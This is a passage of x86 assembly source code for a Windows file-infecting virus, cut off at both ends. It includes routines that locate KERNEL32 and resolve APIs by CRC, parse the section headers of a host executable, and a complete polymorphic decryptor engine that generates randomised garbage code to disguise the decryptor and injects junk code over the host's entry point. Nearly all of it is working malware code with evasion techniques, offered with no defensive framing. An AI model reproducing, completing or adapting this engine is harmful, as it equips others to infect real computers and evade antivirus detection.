				je CRC_API_found
				pop eax							;Remove API name from stack
				pop esi							;Ptr to RVA for next API name 
				loop API_Loop
get_API_error:	pop esi							;Ptr to CRC's of API names
				pop ecx							;Number of API's
				ret								;Exit with error (ecx!=NULL)

CRC_API_found:	;The ptr to API name is already on stack, now push the
				;module handle and call GetProcAddress

				push ebx	
				call dword ptr [ebp+a_GetProcAddress]

				cld					;Dont let the API call change this
				pop edx				;Remove ptr to RVA for next name

				or eax,eax
				jz get_API_error	;If GetProcAddress returned NULL exit
				
				stosd				;Save the API address into given table
				pop esi				;Ptr to CRC's of API names
				lodsd
				pop ecx				
				loop get_each_API
				ret

;----------------------------------------------------------------------------
;Find base address of KERNEL32.DLL 
;Thanks to Jacky Qwerty for the SEH routines
;----------------------------------------------------------------------------

SEH_ExcptBlock  macro
                add esp,-cPushad
                jnz GNtBA_L1
                endm

IGetNtBaseAddr: @SEH_SetupFrame <SEH_ExcptBlock>
                mov ecx,edx
                xchg ax,cx
GNtBA_L0:		dec cx
                jz GNtBA_L2
                add eax,-10000h
                pushad
                mov bx,-IMAGE_DOS_SIGNATURE
                add bx,word ptr [eax]
                mov esi,eax
                jnz GNtBA_L1
                mov ebx,-IMAGE_NT_SIGNATURE
                add eax,dword ptr [esi.MZ_lfanew]
                mov edx,esi
                add ebx,dword ptr [eax]
                jnz GNtBA_L1
                add edx,[eax.NT_OptionalHeader.OH_DirectoryEntries.			\
                         DE_Export.DD_VirtualAddress]
                add esi,dword ptr [edx.ED_Name]
				lea edi,dword ptr [ebp+BufStr2Upper]
				push edi
				call parse_filename
				pop esi
				call get_str_crc32
				cmp edx,dword ptr [ebp+CrcKernel32]	;Is KERNEL32.DLL ?
				je k32_f
GNtBA_L1:		popad
                jmp GNtBA_L0

k32_f:			popad
                xchg ecx,eax
                inc eax

GNtBA_L2:       @SEH_RemoveFrame
                ret

;----------------------------------------------------------------------------
;SEH handling routines
;----------------------------------------------------------------------------

SEH_Frame:		sub edx,edx
                push dword ptr fs:[edx]
                mov fs:[edx],esp
                jmp [esp.(02h*Pshd).RetAddr]

SEH_RemoveFrame:push 00000000h
                pop edx
                pop dword ptr [esp.(02h*Pshd).RetAddr]
                pop dword ptr fs:[edx]
                pop edx
                ret (Pshd)

SEH_SetupFrame:	call SEH_Frame
                mov eax,[esp.EH_ExceptionRecord]
                test byte ptr [eax.ER_ExceptionFlags],                      \
                               EH_UNWINDING or EH_EXIT_UNWIND
                mov eax,dword ptr [eax.ER_ExceptionCode]
                jnz SEH_Search
                add eax,-EXCEPTION_ACCESS_VIOLATION
                jnz SEH_Search
                mov esp,dword ptr [esp.EH_EstablisherFrame]
                mov dword ptr fs:[eax],esp
                jmp dword ptr [esp.(02h*Pshd).Arg1]
SEH_Search:		xor eax,eax
                ret

;----------------------------------------------------------------------------
;Convert RVA to RAW
;
;On entry:
;				ebx -> Host base address
;				edx -> RVA to convert
;On exit:
;				ecx -> Pointer to RAW data or NULL if error
;				edx -> Section delta offset
;				esi -> Pointer to IMAGE_OPTIONAL_HEADER
;				edi -> Pointer to section header                
;----------------------------------------------------------------------------

RVA2RAW:        cld
                mov dword ptr [ebp+search_raw],edx
                mov esi,dword ptr [ebx+MZ_lfanew]
                add esi,ebx
                lodsd
                movzx ecx,word ptr [esi+FH_NumberOfSections]
                jecxz err_RVA2RAW
                movzx edi,word ptr [esi+FH_SizeOfOptionalHeader]
                add esi,IMAGE_SIZEOF_FILE_HEADER
                add edi,esi

                ;Get the IMAGE_SECTION_HEADER that contains RVA
                ;
                ;At this point:
                ;
                ;ebx -> File base address
                ;esi -> Pointer to IMAGE_OPTIONAL_HEADER
                ;edi -> Pointer to first section header
                ;ecx -> Number of sections

s_img_section:  ;Check if address of imports directory is inside this
                ;section

                mov eax,dword ptr [ebp+search_raw]
                mov edx,dword ptr [edi+SH_VirtualAddress]
                sub eax,edx
                cmp eax,dword ptr [edi+SH_VirtualSize]
                jb section_ok

out_of_section: ;Go to next section header

                add edi,IMAGE_SIZEOF_SECTION_HEADER
                loop s_img_section
err_RVA2RAW:    ret

section_ok:     ;Get raw

                mov ecx,dword ptr [edi+SH_PointerToRawData]
                sub edx,ecx
                add ecx,eax
                add ecx,ebx
                ret

;----------------------------------------------------------------------------
;Get code section header and entry-point information
;
;On entry:
;				ebx -> Host base address
;On exit:
;				ecx -> Pointer to RAW data or NULL if error
;				edx -> Entry-point RVA
;				esi -> Pointer to IMAGE_OPTIONAL_HEADER
;				edi -> Pointer to section header
;----------------------------------------------------------------------------

get_code_sh:	call get_last_sh
				mov edx,dword ptr [esi+OH_AddressOfEntryPoint]
				push edx
                call RVA2RAW
				pop edx
				ret

;----------------------------------------------------------------------------
;Get pointer to last section header
;
;On entry:
;				ebx -> Host base address
;On exit:
;				esi -> IMAGE_OPTIONAL_HEADER
;				edi -> Pointer to last section header                
;----------------------------------------------------------------------------

get_last_sh:    push ecx
                mov esi,dword ptr [ebx+MZ_lfanew]
                add esi,ebx
                cld
                lodsd
                movzx ecx,word ptr [esi+FH_NumberOfSections]
                dec ecx
                mov eax,IMAGE_SIZEOF_SECTION_HEADER
                mul ecx
                movzx edx,word ptr [esi+FH_SizeOfOptionalHeader]
                add esi,IMAGE_SIZEOF_FILE_HEADER
                add eax,edx
                add eax,esi
                mov edi,eax
				pop ecx
                ret

;----------------------------------------------------------------------------
;This routine takes a string pointed by esi and copies
;it into a buffer pointed by edi
;The result string will be converted to upper-case
;
;On entry:
;				esi -> Pointer to source string
;				edi -> Pointer to returned string
;
;On exit:
;				al  -> Null
;				edx -> Points to filename at the end of path
;				edi -> Points 1byte above the null terminator
;----------------------------------------------------------------------------

parse_filename:	mov edx,edi
				cld
ScanZstring:	lodsb				
				cmp al,"a"
				jb no_upper
				cmp al,"z"
				ja no_upper
				and al,0DFh
no_upper:		stosb
				cmp al,"\"
				jne err_slash_pos
				mov edx,edi
err_slash_pos:	or al,al
				jnz ScanZstring
				ret

;----------------------------------------------------------------------------
;Generate a random filename
;
;On entry:
;				edi -> Where to place the random generated name
;----------------------------------------------------------------------------

rnd_filename:	call rnd_name
				
rnd_extension:	mov ecx,00000003h						;Set extension				
gen_new_ext:	mov eax,00000019h						;Random character
				call get_rnd_range
				add al,41h
				stosb
				loop gen_new_ext
				xor al,al								;String terminates in
				stosb									;a null character
				ret

rnd_name:		mov eax,00000004h						;Random size of new
				call get_rnd_range						;name
				inc eax
				inc eax
				mov ecx,eax
				
gen_new_name:	mov eax,00000019h						;Random character
				call get_rnd_range
				add al,41h
				stosb
				loop gen_new_name
				mov al,"."								;Is dot time!
				stosb
				ret

rnd_exefile:	call rnd_name
				mov eax,00455845h
				stosd
				ret

;----------------------------------------------------------------------------
;Generate a block of random data
;----------------------------------------------------------------------------

gen_rnd_block:  mov ecx,00000010h
                mov eax,ecx
                call get_rnd_range
                add ecx,eax                
rnd_fill:       cld
rnd_fill_loop:  call get_rnd32              
                stosb
                loop rnd_fill_loop
                ret                

;----------------------------------------------------------------------------
;Linear congruent pseudorandom number generator
;----------------------------------------------------------------------------

get_rnd32:      push ecx
                push edx
                mov eax,dword ptr [ebp+rnd32_seed]
                mov ecx,41C64E6Dh
                mul ecx
                add eax,00003039h
                and eax,7FFFFFFFh
                mov dword ptr [ebp+rnd32_seed],eax
                pop edx
                pop ecx
                ret

;----------------------------------------------------------------------------
;Returns a random num between 0 and entry eax
;----------------------------------------------------------------------------

get_rnd_range:  push ecx
                push edx
                mov ecx,eax
                call get_rnd32
                xor edx,edx
                div ecx
                mov eax,edx  
                pop edx
                pop ecx
                ret

;----------------------------------------------------------------------------
;Generate polymorphic decryptor
;----------------------------------------------------------------------------

mutate_virus:	;Init register table

				call init_reg_tbl

                ;Init the table used by the engine to save the address of 
				;each generator, the structure of this table is:
                ;
                ; 00h -> DWORD -> Address of generator
                ; 04h -> DWORD -> Address of generated subroutine or
                ;                 00000000h if not yet generated
                ;
                ;Lets mark each entry as not yet generated

                xor eax,eax
                mov ecx,00000005h
                lea edi,dword ptr [ebp+style_table+00000004h]
clear_style:    stosd
                add edi,00000004h
                loop clear_style

                ;Clear displacement over displacement field

                mov dword ptr [ebp+disp2disp],ecx
                                
                ;Now choose the register that the engine will use as
                ;index register

                call get_valid_reg
                mov al,byte ptr [ebx+REG_MASK]
                mov byte ptr [ebp+index_mask],al
                or byte ptr [ebx+REG_FLAGS],REG_IS_INDEX

                ;Choose also wich register will be used as counter

                call get_valid_reg
                mov al,byte ptr [ebx+REG_MASK]
                mov byte ptr [ebp+counter_mask],al
                or byte ptr [ebx+REG_FLAGS],REG_IS_COUNTER

                ;The engine generates the following indexing modes:
                ;
                ; DECRYPT [reg]
                ; DECRYPT [reg+imm]
                ; DECRYPT [reg+reg]
                ; DECRYPT [reg+reg+imm]
                ;
                ;This code determines if we are going to use any displacement
                ;and if so, it gets a random one

                call get_rnd32
                and eax,00000001h
                jz ok_disp
                call get_rnd32
                and eax,000FFFFFh
ok_disp:        mov dword ptr [ebp+ptr_disp],eax

                ;Dercrypt instructions such as ADD, SUB or XOR need a
                ;key to use as second operand, choose it here

                call get_rnd32
                mov dword ptr [ebp+crypt_key],eax

                ;This field holds some flags:
                ;
                ; CRYPT_DIRECTION Decrypt up->down or up<-down
                ; CRYPT_CMPCTR    
                ; CRYPT_CDIR      
                ; CRYPT_SIMPLEX   
                ; CRYPT_COMPLEX   
				; CRYPT_FIX_NEG
                                  
                call get_rnd32
                mov byte ptr [ebp+build_flags],al

                ;The counter register needs to be loaded with the size
                ;of the encrypted code divided by the size of the
                ;decrypt instruction (01h for byte, 02h for word or
                ;04h for double word)
                ;This routine determines this size

                call get_rnd32
                and al,03h
                cmp al,01h
                je get_size_ok
                cmp al,02h
                je get_size_ok
                inc al
get_size_ok:    mov byte ptr [ebp+oper_size],al

                ;At any time EDI points to the place where the engine have
                ;to generate the next decryptor instruction

                lea edi,dword ptr [ebp+poly_buffer]
                push edi

                call gen_rnd_block

                ;Generated decryptors are just polymorphic versions of the
                ;following pseudocode:
                ;
                ; Generate decryptor steps, each step into a different
                ; subroutine and in random order each time
                ;
                ; Generate calls to each subrotuine trying to hide this
                ; calls inside lots of random code
                ;
                ;As result generated code will never repeat any sequence
                ;of actions, for example: The routine that loads the index
                ;register can be generated at the begining of the decryptor
                ;or at the end, but it will be called always in the first
                ;call instruction
                ;
                ;Steps into first pseudocode are:
                ;
                ; Generate code that loads the index register
                ; Generate code that loads the counter register
                ; Generate decryp instruction
                ; Increment/Decrement index register in its proper size
                ; Increment/Decrement counter register
                ;
                ;Now start generating one subroutine for each of the above
                ;steps

                mov ecx,00000005h

do_subroutine:  push ecx

                ;Get a random entry in the steps table, remember that each
                ;entry have the following structure:
                ;
                ; 00h -> DWORD -> Address of generator
                ; 04h -> DWORD -> Address of generated subroutine or
                ;                 00000000h if not yet generated

routine_done:   mov eax,00000005h
                call get_rnd_range
                lea esi,dword ptr [ebp+style_table+eax*08h]

                ;Already generated?

                xor edx,edx
                cmp dword ptr [esi+00000004h],edx
                jne routine_done

                ;Generate routines inside some random code, so pseudocode
                ;for each one will look like this:
                ;
                ; Random code
                ; Decryptor step (load index, load counter, decrypt ...)
                ; Random code
                ; RET
                ; Random data
                ;
                ;Note that "random code" will also contain calls, jumps and
                ;lots of no-sense shit that will really hide the code of the
                ;decryptor step
                ;The "random data" will let some space betwen each subrotuine
                ;(size and data are random)
                ;This code will also save the entry-point of each generated
                ;subroutine, so we can call them later

                push edi
                call gen_garbage
                lodsd
                pop dword ptr [esi]
                add eax,ebp
                call eax
                call gen_garbage
                mov al,0C3h
                stosb
                call gen_rnd_block

                ;Generate next subroutine

                pop ecx
                loop do_subroutine

                ;Well, i said that generated decryptors are just polymorphic
                ;versions of the following pseudocode
                ;
                ; Generate decryptor steps, each step into a different
                ; subroutine and in random order each time
                ;
                ; Generate calls to each subroutine trying to hide this
                ; calls inside lots of random code
                ;
                ;Its time to work on the second step

                ;This is the entry-point to the polymorphic decryptor
				
				mov dword ptr [ebp+entry_point],edi
                call gen_garbage

                ;The entry-point of each generated subroutine have been
                ;stored into the steps table
                ;Generate a CALL instruction for each table entry, but
                ;hide the it inside some random code, like this:
                ;
                ; Random code
                ; CALL instruction to the decryptor step subroutine
                ; Random code
                ;
                ;As i already said "random code" may contain another CALLs
                ;and JMPs

                lea esi,dword ptr [ebp+style_table+00000004h]
                mov ecx,00000005h

do_call:        push ecx
                cmp ecx,00000003h
                jne is_not_loop

                ;At this time the CALLs that loads the index and counter
                ;registers have been generated
                ;We need to save current position into decryptor code
                ;in order to jump here on each decryptor iteration
                ;I think is not a bad idea to also hide this point inside
                ;blocks of random code

                call gen_garbage
                mov dword ptr [ebp+loop_point],edi

is_not_loop:    call gen_garbage
                mov al,0E8h
                stosb
                lodsd
                sub eax,edi
                sub eax,00000004h
                stosd
                call gen_garbage
                lodsd
                pop ecx
                loop do_call

                ;The hard work is done, now generate the end condition

                call gen_garbage
                call gen_loop
				call gen_rnd_block
                				
				;Save decryptor size

                pop eax
				sub dword ptr [ebp+entry_point],eax
				push edi
                sub edi,eax
                mov dword ptr [ebp+decryptor_size],edi

				;Generate a junk of polymorphic code that will be injected
				;over host entry-point

				call init_reg_tbl
				pop edi
				push edi
				mov ecx,ep_junk_size
                call rnd_fill
				pop edi
				mov dword ptr [ebp+ep_junk_addr],edi
				call gen_garbage
				mov dword ptr [ebp+ep_junk_fix],edi
				ret

;----------------------------------------------------------------------------
;Perform encryption
;----------------------------------------------------------------------------

perform_crypt:  ;This buffer will contain the code to "crypt" the virus code
                ;followed by a RET instruction

                db 10h dup (90h)

;----------------------------------------------------------------------------
;Initialize register table
;----------------------------------------------------------------------------

init_reg_tbl:	;The engine uses a table that stores the state of each reg
                ;Register table structure is as follows:
                ;
                ; 00h -> Byte -> Register mask
                ; 01h -> Byte -> Register flags
                ;
                ;So now lets clear the state field before start generating
                ;the polymorphic code

                lea esi,dword ptr [ebp+tbl_startup]
                lea edi,dword ptr [ebp+tbl_regs+REG_FLAGS]
                mov ecx,00000007h
                xor eax,eax
				mov byte ptr [ebp+recursive_level],al
loop_init_regs: lodsb
                stosb
                inc edi
                loop loop_init_regs
				ret

;----------------------------------------------------------------------------
;Generate decryptor action: Get delta offset
;----------------------------------------------------------------------------

gen_get_delta:  ;Lets generate polymorphic code for the following pseudocode:
                ;
                ; CALL get_delta
                ; Random data
                ; get_delta:
                ; Random code
                ; POP reg
                ;
                ;Here come the CALL opcode

                mov al,0E8h
                stosb

                ;Let space for the address to call

                stosd
                mov dword ptr [ebp+delta_call],edi
                push edi

                ;Generate some random data

                call gen_rnd_block

                ;Get displacement from CALL instruction to destination
                ;address

                mov eax,edi
                pop esi
                sub eax,esi

                ;Put destination address after CALL opcode

                mov dword ptr [esi-00000004h],eax

                ;This code will be generated where the CALL points to
                ;
                ; Random code
                ; POP index register
                ; Random code
                ; Fix index register value
                ;
                ;Note that "random code" can contain some PUSH and POP
                ;instructions, so there is no equivalence betwen the
                ;first POP after the CALL and the register used as index

                call gen_garbage
                mov al,58h
                or al,byte ptr [ebp+index_mask]
                stosb
                call gen_garbage

                ;Fix using ADD or SUB?

                call get_rnd32
                and al,01h
                jz fix_with_sub

fix_with_add:   ;Generate ADD reg_index,fix_value

                mov ax,0C081h
                or ah,byte ptr [ebp+index_mask]
                stosw
				call fix_master				
				
				stosd
				ret

fix_with_sub:   ;Generate SUB reg_index,-fix_value

                mov ax,0E881h
                or ah,byte ptr [ebp+index_mask]
                stosw				
				call fix_master
				neg eax
				stosd
				ret

fix_master:		lea eax,dword ptr [ebp+poly_buffer-inf_size]
				sub eax,dword ptr [ebp+delta_call]
				add eax,dword ptr [ebp+ptr_disp]				
                
                test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                jz fix_dir_ok

                ;Direction is from top to bottom

                push eax
                call fixed_size2ecx
                xor eax,eax
                mov al,byte ptr [ebp+oper_size]
                push eax
                mul ecx
                pop ecx
                sub eax,ecx
                pop ecx
                add eax,ecx

fix_dir_ok:		ret

;----------------------------------------------------------------------------
;Generate decryptor action: Load counter
;----------------------------------------------------------------------------

gen_load_ctr:   ;Easy now, just move counter random initial value
                ;into counter reg and calculate the end value

                mov al,0B8h
                or al,byte ptr [ebp+counter_mask]
                stosb
                call fixed_size2ecx
                call get_rnd32
                stosd
                test byte ptr [ebp+build_flags],CRYPT_CDIR
                jnz counter_down
counter_up:     add eax,ecx
                jmp short done_ctr_dir
counter_down:   sub eax,ecx
done_ctr_dir:   mov dword ptr [ebp+end_value],eax
                ret

;----------------------------------------------------------------------------
;Generate decryptor action: Decrypt
;----------------------------------------------------------------------------

gen_decrypt:    ;Check if we are going to use a displacement in the
                ;indexing mode
                
                mov eax,dword ptr [ebp+ptr_disp]
                or eax,eax
                jnz more_complex

                ;Choose generator for [reg] indexing mode

                mov edx,offset tbl_idx_reg
                call choose_magic
                jmp you_got_it

more_complex:   ;More fun?!?!

                mov al,byte ptr [ebp+build_flags]
                test al,CRYPT_SIMPLEX
                jnz crypt_xtended

                ;Choose generator for [reg+imm] indexing mode

                mov edx,offset tbl_dis_reg
                call choose_magic

you_got_it:     ;Use magic to convert some values into
                ;desired instructions

                call size_correct
                mov dl,byte ptr [ebp+index_mask]
                lodsb
                or al,al
                jnz adn_reg_01
                cmp dl,00000101b
                je adn_reg_02
adn_reg_01:     lodsb
                or al,dl
                stosb
                jmp common_part                
adn_reg_02:     lodsb
                add al,45h
                xor ah,ah
                stosw
                jmp common_part

crypt_xtended:  ;Choose [reg+reg] or [reg+reg+disp]

                test al,CRYPT_COMPLEX
                jz ok_complex

                ;Get random displacement from current displacement
                ;eeehh?!?

                mov eax,00001000h
                call get_rnd_range
                mov dword ptr [ebp+disp2disp],eax
                call load_aux
                push ebx
                call gen_garbage

                ;Choose generator for [reg+reg+imm] indexing mode

                mov edx,offset tbl_paranoia
                call choose_magic
                jmp short done_xtended

ok_complex:     mov eax,dword ptr [ebp+ptr_disp]
                call load_aux
                push ebx
                call gen_garbage

                ;Choose generator for [reg+reg] indexing mode

                mov edx,offset tbl_xtended
                call choose_magic

done_xtended:   ;Build decryptor instructions

                call size_correct
                pop ebx
                mov dl,byte ptr [ebp+index_mask]
                lodsb
                mov cl,al
                or al,al
                jnz arn_reg_01
                cmp dl,00000101b
                jne arn_reg_01
                lodsb
                add al,40h
                stosb
                jmp short arn_reg_02
arn_reg_01:     movsb
arn_reg_02:     mov al,byte ptr [ebx+REG_MASK]
                shl al,03h
                or al,dl
                stosb
                or cl,cl
                jnz arn_reg_03
                cmp dl,00000101b
                jne arn_reg_03
                xor al,al
                stosb

arn_reg_03:     ;Restore aux reg state

                xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

common_part:    ;Get post-build flags

                lodsb

                ;Insert displacement from real address?

                test al,MAGIC_PUTDISP
                jz skip_disp
                push eax
                mov eax,dword ptr [ebp+ptr_disp]
                sub eax,dword ptr [ebp+disp2disp]
                neg eax
                stosd
                pop eax

skip_disp:      ;Insert key?

                test al,MAGIC_PUTKEY
                jz skip_key
                call copy_key

skip_key:       ;Generate reverse code

                call do_reverse

                ret

;----------------------------------------------------------------------------
;Choose a magic generator
;----------------------------------------------------------------------------

choose_magic:   mov eax,00000006h
                call get_rnd_range
                add edx,ebp
                lea esi,dword ptr [edx+eax*04h]
                lodsd
                add eax,ebp
                mov esi,eax
                ret

;----------------------------------------------------------------------------
;Do operand size correction
;----------------------------------------------------------------------------

size_correct:   lodsb
                mov ah,byte ptr [ebp+oper_size]
                cmp ah,01h
                je store_correct
                inc al
                cmp ah,04h
                je store_correct
                mov ah,66h
                xchg ah,al
                stosw
                ret
store_correct:  stosb
                ret

;----------------------------------------------------------------------------
;Load aux reg with displacement
;----------------------------------------------------------------------------

load_aux:       ;Get a valid auxiliary register

                push eax
                call get_valid_reg
                or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

                ;Move displacement into aux reg

                mov al,0B8h
                or al,byte ptr [ebx+REG_MASK]
                stosb
                pop eax
                neg eax
                stosd
                ret

;----------------------------------------------------------------------------
;Generate crypt-code
;----------------------------------------------------------------------------

do_reverse:     xor eax,eax
                mov al,byte ptr [ebp+oper_size]
                shr eax,01h
                shl eax,02h
                add esi,eax
                lodsd
                add eax,ebp
                mov esi,eax
                push edi
                lea edi,dword ptr [ebp+perform_crypt]
loop_string:    lodsb
                cmp al,MAGIC_ENDSTR
                je end_of_magic
                cmp al,MAGIC_ENDKEY
                je last_spell
                xor ecx,ecx
                mov cl,al
                rep movsb
                jmp short loop_string
last_spell:     call copy_key
end_of_magic:   mov al,0C3h
                stosb
                pop edi
                ret

;----------------------------------------------------------------------------
;Copy encryption key into work buffer taking care about operand size
;----------------------------------------------------------------------------

copy_key:       mov eax,dword ptr [ebp+crypt_key]
                xor ecx,ecx
                mov cl,byte ptr [ebp+oper_size]
loop_key:       stosb
                shr eax,08h
                loop loop_key
                ret

;----------------------------------------------------------------------------
;Generate decryptor action: Move index to next step
;----------------------------------------------------------------------------

gen_next_step:  ;Get number of bytes to inc or dec the index reg

                xor ecx,ecx
                mov cl,byte ptr [ebp+oper_size]

loop_update:    ;Get number of bytes to update with this instruction

                mov eax,ecx
                call get_rnd_range
                inc eax

                ;Check direction

                test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                jnz step_down

                call do_step_up
                jmp short next_update

step_down:      call do_step_down

next_update:    sub ecx,eax
				call gen_garbage
                jecxz end_update
                jmp short loop_update
end_update:     ret

do_step_up:     ;Move index_reg up

                or eax,eax
                jz up_with_inc

                ;Now choose ADD or SUB

                push eax
                call get_rnd32
                and al,01h
                jnz try_sub_1

try_add_1:      mov ax,0C081h
                or ah,byte ptr [ebp+index_mask]
                stosw
                pop eax
                stosd
                ret

try_sub_1:      mov ax,0E881h
                or ah,byte ptr [ebp+index_mask]
                stosw
                pop eax
                neg eax
                stosd
                neg eax
                ret

up_with_inc:    ;Generate INC reg_index

                mov al,40h
                or al,byte ptr [ebp+index_mask]
                stosb
                mov eax,00000001h
                ret

do_step_down:   ;Move index_reg down

                or eax,eax
                jz down_with_dec

                ;Now choose ADD or SUB

                push eax
                call get_rnd32
                and al,01h
                jnz try_sub_2

try_add_2:      mov ax,0C081h
                or ah,byte ptr [ebp+index_mask]
                stosw
                pop eax
                neg eax
                stosd
                neg eax
                ret

try_sub_2:      mov ax,0E881h
                or ah,byte ptr [ebp+index_mask]
                stosw
                pop eax
                stosd
                ret

down_with_dec:  ;Generate DEC reg_index

                mov al,48h
                or al,byte ptr [ebp+index_mask]
                stosb
                mov eax,00000001h
                ret

;----------------------------------------------------------------------------
;Generate decryptor action: Next counter value
;----------------------------------------------------------------------------

gen_next_ctr:   ;Check counter direction and update counter
                ;using a INC or DEC instruction

                test byte ptr [ebp+build_flags],CRYPT_CDIR
                jnz upd_ctr_down
upd_ctr_up:     mov al,40h
                or al,byte ptr [ebp+counter_mask]
                jmp short upd_ctr_ok
upd_ctr_down:   mov al,48h
                or al,byte ptr [ebp+counter_mask]
upd_ctr_ok:     stosb
                ret

;----------------------------------------------------------------------------
;Generate decryptor action: Loop
;----------------------------------------------------------------------------

gen_loop:       ;Use counter reg in CMP instruction?

                test byte ptr [ebp+build_flags],CRYPT_CMPCTR
                jnz doloopauxreg

                ;Generate CMP counter_reg,end_value

                mov ax,0F881h
                or ah,byte ptr [ebp+counter_mask]
                stosw
                mov eax,dword ptr [ebp+end_value]
                stosd

                jmp doloopready

doloopauxreg:   ;Get a random valid register to use in a CMP instruction

                call get_valid_reg
                or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

                ;Move index reg value into aux reg

                mov ah,byte ptr [ebx+REG_MASK]
                shl ah,03h
                or ah,byte ptr [ebp+counter_mask]
                or ah,0C0h
                mov al,8Bh
                stosw

                ;Guess what!?

                push ebx
                call gen_garbage
                pop ebx

                ;Generate CMP aux_reg,end_value

                mov ax,0F881h
                or ah,byte ptr [ebx+REG_MASK]
                stosw
                mov eax,dword ptr [ebp+end_value]
                stosd
                     
                ;Restore aux reg state

                xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

doloopready:    ;Generate conditional jump

                call get_rnd32
                and al,01h
                jnz doloopdown

doloopup:       ;Generate the following structure:
                ;
                ;       loop_point:
                ;       ...
                ;       cmp reg,x
                ;       jne loop_point
                ;       ...
				;		jmp virus

                mov ax,850Fh
                stosw
                mov eax,dword ptr [ebp+loop_point]
                sub eax,edi
                sub eax,00000004h
                stosd
				call gen_garbage

				;Insert a jump to virus code

				mov al,0E9h
				stosb
				lea eax,dword ptr [ebp+poly_buffer]
				sub eax,edi
				sub eax,inf_size+00000004h
				stosd
                ret

doloopdown:     ;...or this one:
                ;
                ;       loop_point:
                ;       ...
                ;       cmp reg,x
                ;       je virus
                ;       ...
                ;       jmp loop_point
                ;       ...

                mov ax,840Fh
                stosw
				lea eax,dword ptr [ebp+poly_buffer]
				sub eax,edi
				sub eax,inf_size+00000004h
				stosd
                call gen_garbage

                ;Insert a jump to loop point

                mov al,0E9h
                stosb
                mov eax,dword ptr [ebp+loop_point]
                sub eax,edi
                sub eax,00000004h
                stosd
                ret

;----------------------------------------------------------------------------
;Generate some garbage code
;----------------------------------------------------------------------------

gen_garbage:    ;More recursive levels allowed?
				
				push ecx
                push esi
                inc byte ptr [ebp+recursive_level]
                cmp byte ptr [ebp+recursive_level],04h
                jae exit_gg

                ;Choose garbage generator

                mov eax,00000004h
                call get_rnd_range
                inc eax
                mov ecx,eax
loop_garbage:   push ecx
                mov eax,(end_garbage-tbl_garbage)/04h
                call get_rnd_range
                lea esi,dword ptr [ebp+tbl_garbage+eax*04h]
                lodsd
                add eax,ebp
                call eax
                pop ecx
                loop loop_garbage

                ;Update recursive level

exit_gg:        dec byte ptr [ebp+recursive_level]
                pop esi
				pop ecx
                ret

;----------------------------------------------------------------------------
;Generate MOV reg,imm
;----------------------------------------------------------------------------

g_movreg32imm:  ;Generate MOV reg32,imm

                call get_valid_reg
                mov al,0B8h
                or al,byte ptr [ebx+REG_MASK]
                stosb
                call get_rnd32
                stosd
                ret

g_movreg16imm:  ;Generate MOV reg16,imm

                call get_valid_reg
                mov ax,0B866h
                or ah,byte ptr [ebx+REG_MASK]
                stosw
                call get_rnd32
                stosw
                ret

g_movreg8imm:   ;Generate MOV reg8,imm

                call get_valid_reg
                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_movreg8imm
                call get_rnd32
                mov al,0B0h
                or al,byte ptr [ebx+REG_MASK]
                push eax
                call get_rnd32
                pop edx
                and ax,0004h
                or ax,dx
                stosw
a_movreg8imm:   ret

;----------------------------------------------------------------------------
;Generate mov reg,reg
;----------------------------------------------------------------------------

g_movregreg32:  call get_rnd_reg
                push ebx
                call get_valid_reg
                pop edx
                cmp ebx,edx
                je a_movregreg32
c_movregreg32:	mov al,8Bh
h_movregreg32:  mov ah,byte ptr [ebx+REG_MASK]
                shl ah,03h
                or ah,byte ptr [edx+REG_MASK]
                or ah,0C0h
                stosw
a_movregreg32:  ret

g_movregreg16:  call get_rnd_reg
                push ebx
                call get_valid_reg
                pop edx
                cmp ebx,edx
                je a_movregreg32
                mov al,66h
                stosb
                jmp short c_movregreg32

g_movregreg8:   call get_rnd_reg
                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_movregreg8
                push ebx
                call get_valid_reg
                pop edx
				mov al,8Ah
h_movregreg8:	test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_movregreg8
                cmp ebx,edx
                je a_movregreg8
                mov ah,byte ptr [ebx+REG_MASK]
                shl ah,03h
                or ah,byte ptr [edx+REG_MASK]
                or ah,0C0h
                push eax
                call get_rnd32
                pop edx
                and ax,2400h
                or ax,dx
                stosw
a_movregreg8:   ret

;----------------------------------------------------------------------------
;Generate xchg reg,reg
;----------------------------------------------------------------------------

g_xchgregreg32:	call get_valid_reg
				push ebx
				call get_valid_reg
				pop edx
				cmp ebx,edx
				je a_movregreg32
h_xchgregreg32:	mov al,87h
				jmp short h_movregreg32

g_xchgregreg16:	call get_valid_reg
				push ebx
				call get_valid_reg
				pop edx
				cmp ebx,edx
				je a_movregreg32
				mov al,66h
				stosb
				jmp short h_xchgregreg32

g_xchgregreg8:	call get_valid_reg
                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_movregreg8
                push ebx
                call get_valid_reg
                pop edx
				mov al,86h
				jmp h_movregreg8

;----------------------------------------------------------------------------
;Generate MOVZX/MOVSX reg32,reg16
;----------------------------------------------------------------------------

g_movzx_movsx:  call get_rnd32
                mov ah,0B7h
                and al,01h
                jz d_movzx
                mov ah,0BFh
d_movzx:        mov al,0Fh
                stosw
                call get_rnd_reg
                push ebx
                call get_valid_reg
                pop edx
                mov al,byte ptr [ebx+REG_MASK]
                shl al,03h
                or al,0C0h
                or al,byte ptr [edx+REG_MASK]
                stosb
                ret

;----------------------------------------------------------------------------
;Generate INC reg
;----------------------------------------------------------------------------

g_inc_reg32:	call get_valid_reg
				mov al,40h
				or al,byte ptr [ebx+REG_MASK]
				stosb
				ret

g_inc_reg16:	mov al,66h
				stosb
				jmp short g_inc_reg32

g_inc_reg8:		call get_valid_reg
                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_inc_reg8
				call get_rnd32
				and ah,04h
				or ah,byte ptr [ebx+REG_MASK]
				or ah,0C0h
				mov al,0FEh
				stosw
a_inc_reg8:		ret

;----------------------------------------------------------------------------
;Generate DEC reg
;----------------------------------------------------------------------------

g_dec_reg32:	call get_valid_reg
				mov al,48h
				or al,byte ptr [ebx+REG_MASK]
				stosb
				ret

g_dec_reg16:	mov al,66h
				stosb
				jmp short g_dec_reg32

g_dec_reg8:		call get_valid_reg
